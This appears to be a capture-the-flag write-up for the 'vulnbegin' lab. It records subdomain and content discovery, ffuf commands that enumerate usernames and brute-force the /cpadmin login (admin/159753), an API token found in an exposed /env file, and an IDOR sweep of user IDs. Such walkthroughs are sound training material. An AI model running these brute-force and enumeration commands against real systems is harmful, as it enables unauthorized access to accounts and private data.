1. [x] Subdomain Discovery
	**cmd**: ``
	1. Using `dnsrecon`
		1. www.vulnbegin.co.uk
		2. server.vulnbegin.co.uk *(has a flag and says `Unauthenticated`)* ![Screenshot](Pasted%20image%2020220527021257.png)
	2. Searching on [crt.sh](https://crt.sh/?q=vulnbegin.co.uk)
		1. v64hss83.vulnbegin.co.uk *(has a flag)*
2. [x] Content Discovery
	1. Using `ffuf`
		1. /cpadmin/
		2. /js/
		3. /css/
		4. /robots.txt/
	2. From `/robots.txt`
		1. /secret_d1rect0y/ *(contains a flag)*
3. [x] Bruteforcing `/cpadmin` using `ffuf`
	**cmd**: `ffuf -w ~/wordlists/usernames.txt -X POST -d "username=FUZZ&password=x" -t 1 -p 0.1 -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSjRZM3A2TTNKMmR5SXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJhYmYwNzRmYWI0Yzk2YjA3OTM4ZDcxNGQ0N2VhZWIzNSJ9" -H "Content-Type: application/x-www-form-urlencoded" -u http://www.vulnbegin.co.uk -fr 'Username is invalid'`
	1. Found `admin` valid
	2. Bruteforced the password and found `159753` working
4. [x] Found that there is an API key and a config file somewhere in the server, so we need a 2nd round of content discovery **with the token we had after logging into the admin account**![Screenshot](Pasted%20image%2020220527012943.png)
	**cmd**: `ffuf -w ~/wordlists/content.txt -t 1 -p 0.1 -H "Cookie: token=2eff535bd75e77b62c70ba1e4dcb2873; ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSjRZM3A2TTNKMmR5SXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJhYmYwNzRmYWI0Yzk2YjA3OTM4ZDcxNGQ0N2VhZWIzNSJ9" -u http://www.vulnbegin.co.uk/cpadmin/FUZZ -mc all -fc 404`
5. [x] Found `/env` and now investigating it. Found an API token `X-Token: 492E64385D3779BC5F040E2B19D67742`
6. [x] Recon the [API](http://server.vulnbegin.co.uk)with the *token* we found.
	1. Content discovery round 3 *to the API*.
		**cmd**: ``
	2. Found `/robot.txt` that has `Disallow: /s3cr3T_d1r3ct0rY/`![Screenshot](Pasted%20image%2020220527024741.png)
	3. Found `/user`![Screenshot](Pasted%20image%2020220527024821.png)
	4. Found `/user/27/info` that has a flag
7. [x] Possible IDOR? Search the space of user IDs.
	**cmd**: `seq 1 100 | ffuf -w - -t 1 -p 0.1 -H "X-Token: 492E64385D3779BC5F040E2B19D67742" -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSjRZM3A2TTNKMmR5SXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJhYmYwNzRmYWI0Yzk2YjA3OTM4ZDcxNGQ0N2VhZWIzNSJ9" -u http://server.vulnbegin.co.uk/user/FUZZ -mc all -fc 404`![Sceenshot](Pasted%20image%2020220527025659.png)
	1. Tried accessing the endpoint of user 5 but it's forbidden.![Screenshot](Pasted%20image%2020220527030229.png)
	2. Tried accessing the other endpoint `/5/info` the was previously found. ![Screenshot](Pasted%20image%2020220527030312.png) Then got the last flag.